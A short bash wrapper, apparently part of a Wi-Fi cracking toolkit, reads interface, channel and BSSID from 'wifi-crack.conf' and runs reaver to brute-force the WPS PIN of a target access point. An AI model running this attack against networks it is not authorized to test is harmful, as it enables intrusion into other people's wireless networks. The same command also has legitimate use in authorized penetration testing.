#!/bin/bash

PWD="$(pwd)"
source "$PWD/wifi-crack.conf"
#### VARIAVEIS UTILIZADAS
# INTERFACE
# CHANNEL
# BSSID


reaver -b $BSSID -c $CHANNEL -i $INTERFACE
